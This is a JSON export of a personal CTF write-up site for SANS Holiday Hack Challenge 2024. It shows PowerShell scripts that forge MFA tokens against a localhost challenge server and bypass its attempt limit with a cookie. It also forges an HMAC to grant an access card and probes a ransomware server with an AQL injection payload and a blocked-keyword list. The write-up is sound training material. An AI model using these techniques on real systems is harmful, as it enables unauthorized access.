-UseBasicParsing # Split the content into words and check if it contains exactly 138 words if (($pageContent.Content -split '\\s+').Count -eq 138) { # Output the found page and its content Write-Output \"Found page with 138 words: $($link.href)\" Write-Output $pageContent.Content break # Stop searching after finding the first matching page } } Output\nFound page with 138 words: http://localhost:1225/endpoints/13 \u003chtml\u003e\u003chead\u003e\u003ctitle\u003eMFA token scrambler\u003c/title\u003e\u003c/head\u003e\u003cbody\u003e\u003cp\u003eYuletide cheer fills the air,\u003cbr\u003e A season of love, of care.\u003cbr\u003e The world is bright, full of light,\u003cbr\u003e As we celebrate this special night.\u003cbr\u003e The tree is trimmed, the stockings hung,\u003cbr\u003e Carols are sung, bells are rung.\u003cbr\u003e Families gather, friends unite,\u003cbr\u003e In the glow of the fire’s light.\u003cbr\u003e The air is filled with joy and peace,\u003cbr\u003e As worries and cares find release.\u003cbr\u003e Yuletide cheer, a gift so dear,\u003cbr\u003e Brings warmth and love to all near.\u003cbr\u003e May we carry it in our hearts,\u003cbr\u003e As the season ends, as it starts.\u003cbr\u003e Yuletide cheer, a time to share,\u003cbr\u003e The love, the joy, the care.\u003cbr\u003e May it guide us through the year,\u003cbr\u003e In every laugh, in every tear.\u003cbr\u003e Yuletide cheer, a beacon bright,\u003cbr\u003e Guides us through the winter night \u003c/p\u003e\u003cp\u003e Note to self, remember to remove temp csvfile at http://127.0.0.1:1225/token_overview.csv\u003c/p\u003e\u003c/body\u003e\u003c/html\u003e Task 7 There seems to be a csv file in the comments of that page. That could be valuable, read the contents of that csv-file! # Define the base URL and credentials $baseUrl = \"http://127.0.0.1:1225\" $credentials = \"admin:admin\" $encodedAuth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($credentials)) $headers = @{ Authorization = \"Basic $encodedAuth\" } # Perform the initial web request to get the main page content $response = Invoke-WebRequest -Uri $baseUrl -Headers $headers -UseBasicParsing # Filter the links to those that match the endpoint pattern $endpointLinks = $response.Links | Where-Object { $_.href -like \"http://localhost:1225/endpoints/*\" } # Loop through each endpoint link foreach ($link in $endpointLinks) { # Request the content of the current endpoint $pageContent = Invoke-WebRequest -Uri $link.href -Headers $headers -UseBasicParsing # Check if the content has exactly 138 words if (($pageContent.Content -split '\\s+').Count -eq 138) { # Search for a CSV URL in the content if ($pageContent.Content -match '(http[^\"]+\\.csv)') { $csvUrl = $matches[1] # Extract the CSV URL from the match # Fetch the CSV content from the extracted URL $csvContent = Invoke-WebRequest -Uri $csvUrl -Headers $headers -UseBasicParsing $csvContent.Content | Write-Output # Output the CSV content } break # Stop searching after finding the first matching page } } Output\n6ef5570cd43a3ec9f43c57f662201e55,REDACTED bf189d47c3175ada98af398669e3cac3,REDACTED 743ac25389a0b430dd9f8e72b2ec9d7f,REDACTED 270aabd5feaaf40185f2effa9fa2cd6e,REDACTED 8b58850ee66bd2ab7dd2f5f850c855f8,REDACTED 6fd00cbda10079b1d55283a88680d075,REDACTED 612001dd92369a7750c763963bc327f0,REDACTED 010f2cc580f74521c86215b7374eead6,REDACTED 29860c67296d808bc6506175a8cbb422,REDACTED 7b7f6891b6b6ab46fe2e85651db8205f,REDACTED 45ffb41c4e458d08a8b08beeec2b4652,REDACTED d0e6bfb6a4e6531a0c71225f0a3d908d,REDACTED bd7efda0cb3c6d15dd896755003c635c,REDACTED 5be8911ced448dbb6f0bd5a24cc36935,REDACTED 1acbfea6a2dad66eb074b17459f8c5b6,REDACTED 0f262d0003bd696550744fd43cd5b520,REDACTED 8cac896f624576d825564bb30c7250eb,REDACTED 8ef6d2e12a58d7ec521a56f25e624b80,REDACTED b4959370a4c484c10a1ecc53b1b56a7d,REDACTED 38bdd7748a70529e9beb04b95c09195d,REDACTED 8d4366f08c013f5c0c587b8508b48b15,REDACTED 67566692ca644ddf9c1344415972fba8,REDACTED 8fbf4152f89b7e309e89b9f7080c7230,REDACTED 936f4db24a290032c954073b3913f444,REDACTED c44d8d6b03dcd4b6bf7cb53db4afdca6,REDACTED cb722d0b55805cd6feffc22a9f68177d,REDACTED 724d494386f8ef9141da991926b14f9b,REDACTED 67c7aef0d5d3e97ad2488babd2f4c749,REDACTED 5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C # [*] SYSTEMLOG # [*] Defence mechanisms activated, REDACTING endpoints, starting with sensitive endpoints # [-] ERROR, memory corruption, not all endpoints have been REDACTED # [*] Verification endpoint still active # [*] http://127.0.0.1:1225/tokens/\u003csha256sum\u003e # [*] Contact system administrator to unlock panic mode # [*] Site functionality at minimum to keep weapons active Task 8 Luckily the defense mechanisms were faulty! There seems to be one api-endpoint that still isn’t redacted! Communicate with that endpoint! $response = Invoke-WebRequest -Uri \"http://127.0.0.1:1225\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" } -UseBasicParsing; $response.Links | Where-Object { $_.href -like \"http://localhost:1225/endpoints/*\" } | ForEach-Object { $pageContent = Invoke-WebRequest -Uri $_.href -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" } -UseBasicParsing; if (($pageContent.Content -split '\\s+').Count -eq 138) { if ($pageContent.Content -match '(http[^\"]+\\.csv)') { $csvUrl = $matches[1]; $csvContent = Invoke-WebRequest -Uri $csvUrl -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" } -UseBasicParsing; # Split each line by comma and return the last value (assumed hash) $csvContent.Content -split \"`n\" | Where-Object { $_ -match '\\b[a-fA-F0-9]{64}\\b' } | ForEach-Object { $fields = $_ -split ',' # Split the line by comma $sha256sum = $fields[-1] # Get the last field (SHA256 hash) # Send a web request with the SHA256 hash $url = \"http://127.0.0.1:1225/tokens/$sha256sum\" $response = Invoke-WebRequest -Uri $url -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" } -Method Get -UseBasicParsing # Output the response or relevant data $response.Content } } break } } Output\n\u003ch1\u003e[!] ERROR: Missing Cookie 'token'\u003c/h1\u003e Task 9 It looks like it requires a cookie token, set the cookie and try again. # Fetch the content from the URL $response = Invoke-WebRequest -Uri \"http://127.0.0.1:1225/token_overview.csv\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" } -UseBasicParsing # Split the content into lines, filter out lines containing 'REDACTED', '#', 'file_MD5hash', or 'Sha256(file_MD5hash)' $filteredContent = $response.Content -split \"`n\" | Where-Object { $_ -notmatch \"REDACTED\" -and $_ -notmatch \"#\" -and $_ -notmatch \"file_MD5hash\" -and $_ -notmatch \"Sha256\\(file_MD5hash\\)\" } # Convert the filtered lines into an object (in-memory CSV structure) $csvData = $filteredContent | ForEach-Object { $fields = $_ -split \",\" # Split each line by commas into an array of fields [PSCustomObject]@{ Column1 = $fields[0] Column2 = $fields[1] } } $sha256Sum = $csvData.Column2 $md5Sum = $csvData.Column1 $response = Invoke-WebRequest -Uri \"http://127.0.0.1:1225/tokens/$sha256Sum\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" Cookie = \"token=$md5Sum\" } -UseBasicParsing $response.Content Alternatively, I also used this - but the challenge text didn’t change, but the output is nevertheless the same:\nInvoke-WebRequest -Uri \"http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C\" -Headers @{ 'Cookie' = \"token=5f8dd236f862f4507835b0e418907ffc\" } -Credential \"admin\" -AllowUnencryptedAuthentication; Output\nStatusCode : 200 StatusDescription : OK Content : \u003ch1\u003eCookie 'mfa_code', use it at \u003ca href='1732382646.3496673'\u003e/mfa_validate/4216B4FAF4391EE4D3E 0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C\u003c/a\u003e\u003c/h1\u003e RawContent : HTTP/1.1 200 OK Server: Werkzeug/3.0.6 Server: Python/3.10.12 Date: Sat, 23 Nov 2024 17:24:06 GMT Connection: close Content-Type: text/html; charset=utf-8 Content-Length: 149 \u003ch1\u003eCookie 'mfa_code', u… Headers : {[Server, System.String[]], [Date, System.String[]], [Connection, System.String[]], [Content-Ty pe, System.String[]]…} Images : {} InputFields : {} Links : {@{outerHTML=\u003ca href='1732382646.3496673'\u003e/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5 D124FE08E227F84D687A7E06C\u003c/a\u003e; tagName=A; href=1732382646.3496673}} RawContentLength : 149 RelationLink : {} Task 10 Sweet we got a MFA token! We might be able to get access to the system. Validate that token at the endpoint! # Fetch the content from the URL $response = Invoke-WebRequest -Uri \"http://127.0.0.1:1225/token_overview.csv\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" } -UseBasicParsing # Split the content into lines, filter out lines containing 'REDACTED', '#', 'file_MD5hash', or 'Sha256(file_MD5hash)' $filteredContent = $response.Content -split \"`n\" | Where-Object { $_ -notmatch \"REDACTED\" -and $_ -notmatch \"#\" -and $_ -notmatch \"file_MD5hash\" -and $_ -notmatch \"Sha256\\(file_MD5hash\\)\" } # Convert the filtered lines into an object (in-memory CSV structure) $csvData = $filteredContent | ForEach-Object { $fields = $_ -split \",\" # Split each line by commas into an array of fields [PSCustomObject]@{ Column1 = $fields[0] Column2 = $fields[1] } } $sha256Sum = $csvData.Column2 $md5Sum = $csvData.Column1 $response = Invoke-WebRequest -Uri \"http://127.0.0.1:1225/tokens/$sha256Sum\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" Cookie = \"token=$md5Sum\" } -UseBasicParsing $time_code = [regex]::match($response.Content,\"href='(.+)'\").Groups[1].Value $urlpath = [regex]::match($response.Content,\"'\u003e(.+)\u003c/a\u003e\").Groups[1].Value $response = Invoke-WebRequest -Uri \"http://127.0.0.1:1225$urlpath\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" Cookie = \"mfa_code=$time_code; token=$md5Sum; mfa_token=$time_code\" } -UseBasicParsing $response.Content Output\nQ29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg== Inside the HTML there is a Base64 string, which decodes to:\nCorrect Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction Task 11 That looks like base64! Decode it so we can get the final secret! # Fetch the content from the URL $response = Invoke-WebRequest -Uri \"http://127.0.0.1:1225/token_overview.csv\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" } -UseBasicParsing # Split the content into lines, filter out lines containing 'REDACTED', '#', 'file_MD5hash', or 'Sha256(file_MD5hash)' $filteredContent = $response.Content -split \"`n\" | Where-Object { $_ -notmatch \"REDACTED\" -and $_ -notmatch \"#\" -and $_ -notmatch \"file_MD5hash\" -and $_ -notmatch \"Sha256\\(file_MD5hash\\)\" } # Convert the filtered lines into an object (in-memory CSV structure) $csvData = $filteredContent | ForEach-Object { $fields = $_ -split \",\" # Split each line by commas into an array of fields [PSCustomObject]@{ Column1 = $fields[0] Column2 = $fields[1] } } $sha256Sum = $csvData.Column2 $md5Sum = $csvData.Column1 $response = Invoke-WebRequest -Uri \"http://127.0.0.1:1225/tokens/$sha256Sum\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" Cookie = \"token=$md5Sum\" } -UseBasicParsing $time_code = [regex]::match($response.Content,\"href='(.+)'\").Groups[1].Value $urlpath = [regex]::match($response.Content,\"'\u003e(.+)\u003c/a\u003e\").Groups[1].Value $response = Invoke-WebRequest -Uri \"http://127.0.0.1:1225$urlpath\" -Headers @{ Authorization = \"Basic $([Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')))\" Cookie = \"mfa_code=$time_code; token=$md5Sum; mfa_token=$time_code\" } -UseBasicParsing [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String([regex]::match($response.Content,\"\u003cp\u003e(.+)\u003c/p\u003e\").Groups[1].Value)) Output 1\nCorrect Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction Final Hurray! You have thwarted their defenses! Alabaster can now access their weaponry and put a stop to it. Once HHC grants your achievement, you can close this terminal.\nGold Hints PowerShell Admin Access - Fakeout EDR Threshold From: Terminal: PowerShell They also mentioned this lazy elf who programmed the security settings in the weapons terminal. He created a fakeout protocol that he dubbed Elf Detection and \u003e Response “EDR”. The whole system is literally that you set a threshold and after that many attempts, the response is passed through… I can’t believe it. He \u003e supposedly implemented it wrong so the threshold cookie is highly likely shared between endpoints!\nPowerShell Admin Access - Total Control From: Terminal: PowerShell I overheard some of the other elves talking. Even though the endpoints have been redacted, they are still operational. This means that you can probably elevate your access by communicating with them. I suggest working out the hashing scheme to reproduce the redacted endpoints. Luckily one of them is still active and can be tested against. Try hashing the token with SHA256 and see if you can reliably reproduce the endpoint. This might help, pipe the tokens to Get-FileHash -Algorithm SHA256.\nSolution From the hint it we know that there is an EDR in place that reacts on number of attempts trid. The hint also hints at if there’s more attempts than an unknown threshold, the attempts just passed through. Looking at the other hint, I figured out I have to try to see if there are some other endpoints available too. So, to solve Gold, I had a sitdown with myself to refactor my previous code by taking basis in solution 7 and 10 above and create something new. Ended up with this:\n# Define base URL and credentials $baseUrl = \"http://127.0.0.1:1225\" $username = \"admin\" $password = \"admin\" # Create a secure credential object $credential = New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString $password -AsPlainText -Force)) # Download CSV file try { $csvResponse = Invoke-WebRequest -Uri \"$baseUrl/token_overview.csv\" -Credential $credential -AllowUnencryptedAuthentication -UseBasicParsing $csvResponse.Content \u003e tokens.csv } catch { Write-Error \"Failed to download CSV: $_\" exit } # Parse CSV try { $csvData = Import-Csv -Path \"tokens.csv\" } catch { Write-Error \"Failed to parse CSV: $_\" exit } # Process each row foreach ($row in $csvData) { try { # Access MD5 hash from the row $md5Sum = $row.file_MD5hash # Compute SHA256 hash using a temporary file $tempFile = New-TemporaryFile $md5Sum | Out-File -FilePath $tempFile.FullName -Encoding ASCII $sha256Sum = (Get-FileHash -Path $tempFile.FullName -Algorithm SHA256).Hash.Trim() Remove-Item -Path $tempFile.FullName -Force # Fetch MFA token $mfaResponse = Invoke-WebRequest -Uri \"$baseUrl/tokens/$sha256Sum\" -Credential $credential -AllowUnencryptedAuthentication -Headers @{ Cookie = \"token=$md5Sum\" } -UseBasicParsing # Extract MFA token if ($mfaResponse.Content -match \"href='([^']+)'\") { $mfaToken = $matches[1] } else { continue } # Validate MFA with mfa_token included $validationResponse = Invoke-WebRequest -Uri \"$baseUrl/mfa_validate/$sha256Sum\" -Credential $credential -AllowUnencryptedAuthentication -Headers @{ Cookie = \"token=$md5Sum; mfa_token=$mfaToken; attempts=11111111111111111111111111111111111111111111111\" } -UseBasicParsing # Check if the response contains \"ERROR: Access Denied\" and suppress it if ($validationResponse.Content -notmatch \"ERROR: Access Denied\") { Write-Output \"Validation Response for $md5Sum : $($validationResponse.Content)\" } } catch { Write-Error \"An error occurred while processing MD5 hash $($row.file_MD5hash): $_\" continue } } Along the way I stumbled over a cookie named “attempts”, which I just sat to a redicilous high value. The script output this: Output\nValidation Response for 45ffb41c4e458d08a8b08beeec2b4652 : \u003ch1\u003e[+] Success, defense mechanisms deactivated.\u003c/h1\u003e\u003cbr\u003eAdministrator Token supplied, You are able to control the production and deployment of the snow cannons. May the best elves win: WombleysProductionLineShallPrevail\u003c/p\u003e Validation Response for 5f8dd236f862f4507835b0e418907ffc : \u003ch1\u003e[+] Success\u003c/h1\u003e\u003cbr\u003e\u003cp\u003eQ29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==",
    "description": "Objecetive Team Wombley is developing snow weapons in preparation for conflict, but they’ve been locked out by their own defenses. Help Piney with regaining access to the weapon operations terminal.\nSolution Silver Task 1 There is a file in the current directory called ‘welcome.txt’. Read the contents of this file Get-Content -Path \".\\welcome.txt\" Output\nSystem Overview The Elf Weaponry Multi-Factor Authentication (MFA) system safeguards access to a classified armory containing elf weapons.",
    "tags": [],
    "title": "Powershell",
    "uri": "/act2/powershell/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Act1",
    "content": "Objective (main) Ready your tools and sharpen your wits—only the cleverest can untangle the wires and unlock Santa’s hidden secrets!\nHardware Hacking 101 Part 1 Objective Jingle all the wires and connect to Santa’s Little Helper to reveal the merry secrets locked in his chest!\nSolution for silver In the hint section I found this helpful hint:\nOn the Cutting Edge From: Morcel Nougat Terminal: Hardware Part 1 Hey, I just caught wind of this neat way to piece back shredded paper! It’s a fancy heuristic detection technique—sharp as an elf’s wit, I tell ya! Got a sample Python script right here, courtesy of Arnydo. Check it out when you have a sec: heuristic_edge_detection.py.\"\nI downloaded the script:\nimport os import numpy as np from PIL import Image def load_images(folder): images = [] filenames = sorted(os.listdir(folder)) for filename in filenames: if filename.endswith('.png') or filename.endswith('.jpg'): img = Image.open(os.path.join(folder, filename)).convert('RGB') images.append(np.array(img)) return images def calculate_difference(slice1, slice2): # Calculate the sum of squared differences between the right edge of slice1 and the left edge of slice2 return np.sum((slice1[:, -1] - slice2[:, 0]) ** 2) def find_best_match(slices): n = len(slices) matched_slices = [slices[0]] slices.pop(0) while slices: last_slice = matched_slices[-1] differences = [calculate_difference(last_slice, s) for s in slices] best_match_index = np.argmin(differences) matched_slices.append(slices.pop(best_match_index)) return matched_slices def save_image(images, output_path): heights, widths, _ = zip(*(i.shape for i in images)) total_width = sum(widths) max_height = max(heights) new_image = Image.new('RGB', (total_width, max_height)) x_offset = 0 for img in images: pil_img = Image.fromarray(img) new_image.paste(pil_img, (x_offset, 0)) x_offset += pil_img.width new_image.save(output_path) def main(): input_folder = \"/mnt/c/Users/Roger Johnsen/Downloads/HHC2024/shreds/slices\" output_path = \"/mnt/c/Users/Roger Johnsen/Downloads/HHC2024/assembled_image.png\" slices = load_images(input_folder) matched_slices = find_best_match(slices) save_image(matched_slices, output_path) if __name__ == '__main__': main() I only changed the “input_folder” and “output_path” variables and ran the script. Once finished, it assembled the pieced into this image:\nImage isn’t particularly easy to read. Thus some manual work needs to be done:\nImage assembled are mirrored. In order to mirror it readable, I used this site which offers basic image editing tools: https://www.resizepixel.com/ After mirroring the image, I used https://www.photopea.com/ to rearrange the elements in the picture, making the whole lot readable: Opening the task itself, we are presented a book:\nAnd by closing the book we are presented with a nifty play area:\nConnecting the wires game! The way I solved was to\nPower up the controller (upper right corner) Enter the values from the shredded note (see controllers screen) Conenct USB from controller to UART bridge. Connecting the wires completely willy-nillingly from UART bridge. Selecting a port on the controller. Hit “S” button on the controller to see if it worked. Well. That was the general recipe. In real life, though, I had forgotten to flip the 5V switch over to 3V - so things got a bit toasty here and there. And I also had to cycle the com ports before eventually landing on using USB0.\nAnd by this silver was won!\nSolution for gold For going for gold, I first found the Iframe source:\nThen ran that URL through BurpSuite Browser, where I found a reference to V1 of the API. This hint was located in “main.js” script file.\nHaving captured the post request to solve the game using V2 of the API (basically the same as the GUI game), I just changed the text to refer to V1 of the API:\nDone.\nHardware Hacking 101 Part 2 Santa’s gone missing, and the only way to track him is by accessing the Wish List in his chest—modify the access_cards database to gain entry!\nSolution for Silver Jewel Loggins also gives the following tips:\nFantastic! You managed to connect to the UART interface—great work with those tricky wires! I couldn’t figure it out myself…\nRumor has it you might be able to bypass the hardware altogether for the gold medal. Why not see if you can find that shortcut?\nNext, we need to access the terminal and modify the access database. We’re looking to grant access to card number 42.\nStart by using the slh application—that’s the key to getting into the access database. Problem is, the ‘slh’ tool is password-protected, so we need to find it first.\nSearch the terminal thoroughly; passwords sometimes get left out in the open.\nOnce you’ve found it, modify the entry for card number 42 to grant access. Sounds simple, right? Let’s get to it!\nOpening the terminal, selecting option 1 (“Startup system …”):\nTaking a look around the folder I am currently in, I find a SQLite database:\nTaking a look at the bash history, I found a password (in a command string):\nThe command string is:\nslh --passcode CandyCaneCrunch77 --set-access 1 --id 143 To solve this I consulted the help section using the command slh --help, which then made me better understand how to use it:\nSolution for Gold Jewel Loggins gives following hint regarding the Gold solution:\nThere’s a tougher route if you’re up for the challenge to earn the Gold medal. It involves directly modifying the database and generating your own HMAC signature.\nWe already know the location and name of the SQLite database, so let’s connect:\nsqlite3 access_cards .tables select * from config; select * from access_cards where id = 42; PRAGMA table_info([access_cards]); From the content of table of “config” and “access_cards”, we’ll be using the following information to craft our HMAC signature:\nWhat Value Comment hmac_secret 9ed1515819dec61fd361d5fdabb57f41ecce1a5fe1fe263b98c0d6943b9b232e hmac_message_format {access}{uuid} UUID c06018b6-5e80-4395-ab71-ae5124560189 From table “access_cards” where ID is 42 In order for this to work, we have to use the following formula for input into the HMAC function in Cyberchef:\naccess_levelUUID = 1 + c06018b6-5e80-4395-ab71-ae5124560189\t== 1c06018b6-5e80-4395-ab71-ae5124560189\tThus, concatening the access_level and UUDI without an delimiter. Then we can apply it like so in Cyberchef:\nIt took me forever to figure out that HMAC function was set up using Hex for key, which gave me the wrong output. Switched to UTF-8 as key format and that gave me the correct results. I then could run the following SQL update statement:\nupdate access_cards set sig=\"135a32d5026c5628b1753e6c67015c0f04e26051ef7391c2552de2816b1b7096\", access=1 where id = 42; And Bob’s your uncle! :)",
    "description": "Objective (main) Ready your tools and sharpen your wits—only the cleverest can untangle the wires and unlock Santa’s hidden secrets!\nHardware Hacking 101 Part 1 Objective Jingle all the wires and connect to Santa’s Little Helper to reveal the merry secrets locked in his chest!\nSolution for silver In the hint section I found this helpful hint:\nOn the Cutting Edge From: Morcel Nougat Terminal: Hardware Part 1 Hey, I just caught wind of this neat way to piece back shredded paper!",
    "tags": [],
    "title": "Hardware Hacking 101",
    "uri": "/act1/hardware-hacking/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Prologue",
    "content": "Objective Assist Poinsettia McMittens with playing a game of Elf Minder 9000.\nSolution pr. level. Sandy Start Waves and crates Tidal Treasures Dune Dash In order to solve this, we must turn the trajectory path for the elf once he has gone back into the tunnel, so that on the return he’ll hook up to the path leading to the goal flag.\nCoral Cove Shell Seekers Palm Gove Shuffle Once the elf has gone through the tunnel, we change the trajectory path so upon return the elf will head for the spring instead.\nTropical Tangle For this level we must change trajectory two times in order to traverse into the goal flag.\nCrate Caper In this level we must change the trajectory multiple times. The elf has to be routed to the goal flag and back using multiple routes in order to collect the crates.\nShoreline Shuffle Yet again, this level consists of multiple trajectory path changes in order to collec the crates\nBeach Bounty Driftwood Dunes This was pretty straight forward, no change of trajectory neeeded\nA real pickle Stumbled on this part in the HTML source code, apparently it is an editor:\nRemoved the “hidden” stylesheet tag to make it visible:\nClicked the “Clear Entities” button, and placed a tunnel at the goal flag:\nThen clicked restart:\nhttps://hhc24-elfminder.holidayhackchallenge.com/game2.js\nif (isEditor) { adminControls.classList.remove('hidden'); console.log('⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡'); console.log('⚡ Hey, I noticed you are in edit mode! Awesome!'); console.log('⚡ Use the tools to create your own level.'); console.log('⚡ Level data is saved to a variable called `game.entities`.'); console.log('⚡ I\\'d love to check out your level--'); console.log('⚡ Email `JSON.stringify(game.entities)` to evan@counterhack.com'); console.log('⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡'); } Mapping Movement Y-axis Position Value Content game.entities[0][1] 1 First dot from upper right corner game.entities[0][1] 10 Last dot from upper right corner, max. 10 X-axis Position Value Content game.entities[0][0] 1 First dot from upper left side game.entities[0][0] 10 Last dot from upper left side, max. 12 Entities Entity Value Entity Type game.entities[0][2] 0 Start game.entities[0][2] 1 Flag game.entities[0][2] 2 Crate game.entities[0][2] 3 Stone game.entities[0][2] 4 Sleepy Crab game.entities[0][2] 5 Sizzling Sand game.entities[0][2] 6 Tunnel game.entities[0][2] 7 Spring game.entities.forEach((item) =\u003e { // Move start flag if (item[2] == 0) { item[0] = 1; item[1] = 1; } // Move goal flag else if (item[2] == 1) { item[0] = 1; item[1] = 9; } // Move crates else if (item[2] == 2) { item[0] = 1; } // Other things else { item[1] = 12 } }); game.entities.forEach((item) =\u003e { if (item[2] !== 0 \u0026\u0026 item[2] !== 1 \u0026\u0026 item[2] !== 2) { item[1] = 12; } }); enable edit mode: https://hhc24-elfminder.holidayhackchallenge.com/index.html?id=30d23f1c-4d17-4646-8475-f8ed051fbaf2\u0026level=Sandy%20Start\u0026edit=1",
    "description": "Objective Assist Poinsettia McMittens with playing a game of Elf Minder 9000.\nSolution pr. level. Sandy Start Waves and crates Tidal Treasures Dune Dash In order to solve this, we must turn the trajectory path for the elf once he has gone back into the tunnel, so that on the return he’ll hook up to the path leading to the goal flag.\nCoral Cove Shell Seekers Palm Gove Shuffle Once the elf has gone through the tunnel, we change the trajectory path so upon return the elf will head for the spring instead.",
    "tags": [],
    "title": "Elf Minder 9000",
    "uri": "/prologue/elf-minder-9000/index.html"
  },
  {
    "breadcrumb": "HHC 2024",
    "content": "Now Wombley’s gone and gotten the Naughty-Nice list ransomwared! Santa is not pleased…\nMaybe Fitzy, Ribb, and Tangle can help mend the situation.",
    "description": "Now Wombley’s gone and gotten the Naughty-Nice list ransomwared! Santa is not pleased…\nMaybe Fitzy, Ribb, and Tangle can help mend the situation.",
    "tags": [],
    "title": "Act3",
    "uri": "/act3/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Act3",
    "content": "Objective Wombley’s ransomware server is threatening to publish the Naughty-Nice list. Find a way to deactivate the publication of the Naughty-Nice list by the ransomware server.\nHints From Hint Dusty Giftwrap There must be a way to deactivate the ransomware server’s data publication. Perhaps one of the other North Pole assets revealed something that could help us find the deactivation path. If so, we might be able to trick the Frostbit infrastructure into revealing more details. Dusty Giftwrap The Frostbit author may have mitigated the use of certain characters, verbs, and simple authentication bypasses, leaving us blind in this case. Therefore, we might need to trick the application into responding differently based on our input and measure its response. If we know the underlying technology used for data storage, we can replicate it locally using Docker containers, allowing us to develop and test techniques and payloads with greater insight into how the application functions. Note Had to rededownload the artefacts anew due to the timer on the ransomware note page timed out. References to ids and such might differ from here on from time to time.\nSolution Gold From other objectives I have already found the deactivation endpoint:\nFor clarity:\n/api/v1/frostbitadmin/bot/\u003cbotuuid\u003e/deactivate It appears to requiring “authHeader: X-API-Key” set.\nLooking at what HTTP verbs the endpoint support I see:\nGET HEAD OPTIONS The tip mentions that the infratructure may reveal something about itself, let’s try the debug trick from earlier objectives:\nFor clarity, here’s the output:\n{\"debug\":true,\"error\":\"Timeout or error in query:\\nFOR doc IN config\\n FILTER doc.\u003ckey_name_omitted\u003e == '{user_supplied_x_api_key}'\\n \u003cother_query_lines_omitted\u003e\\n RETURN doc\"} This query language looks like ArangoDB, and ChatGPT think that as well. There’s a mention of “user_supplied_x_api_key”. Let’s see if I can trigger something by manipulating it:\nFor clarity, here’s the output:\n{\"debug\":true,\"error\":\"Invalid Key\"} Setting header field:\nX-Api-Key: 'OR 1 == 1 // Yields this error:\n{\"debug\":true,\"error\":\"Request Blocked\"} Overview of keywords allowed or blocked It appears that certain keywords are blocked, trying to map them out ( according to https://docs.arangodb.com/stable/aql/fundamentals/syntax/ ):\nKeyword Description AGGREGATE Performs an aggregation operation over a set of documents. ALL Used to check if all elements in a collection or array meet a condition. ALL_SHORTEST_PATHS Computes all shortest paths between two nodes in a graph. AND Logical operator used to combine two conditions. ANY Returns a single element that satisfies a condition from an array. ASC Sorts results in ascending order. COLLECT Groups results and aggregates them into a single result set. DESC Sorts results in descending order. DISTINCT Removes duplicate results from the query result. FALSE Boolean literal representing a false value. GRAPH Refers to a graph in ArangoDB, typically used in graph queries. IN Checks if a value is contained within a set, array, or collection. INBOUND Refers to inbound edges in a graph traversal. INTO Used to insert the result of a query into a new or existing collection. K_PATHS Computes the k paths between two nodes in a graph. K_SHORTEST_PATHS Computes the k shortest paths between two nodes in a graph. LIKE Performs pattern matching on strings, similar to SQL’s LIKE. LIMIT Restricts the number of results returned by a query. NONE Represents an empty set or the negation of a condition. NOT Logical negation operator, used to negate a condition. NULL Represents a null value. OR Logical operator used to combine two conditions. OUTBOUND Refers to outbound edges in a graph traversal. REMOVE Deletes documents from a collection. REPLACE Replaces an existing document in a collection with a new one. SHORTEST_PATH Computes the shortest path between two nodes in a graph. SORT Sorts results by one or more fields. TRUE Boolean literal representing a true value. UPSERT Inserts a document if it doesn’t exist, or updates it if it does. WINDOW Used to define a subset of documents, typically for analysis. SEARCH Searches for documents or patterns in collections. Digging deeper into the abyss I know the backend is running ArangDB. On this stage I thought I could be lucky exploiting the LFI from “encryption” challenge to obtain more information. I customized the Python script I used to calculate the LFI URL to take into account user input:\nimport requests import urllib.parse import re import base64 botid = \"9acf5a6b-52ff-43a5-b06f-1d1232d1cbef\" nonce = bytes([ 0x56, 0xee, 0x28, 0x37, 0x27, 0x8f, 0x66, 0x34, 0x56, 0xee, 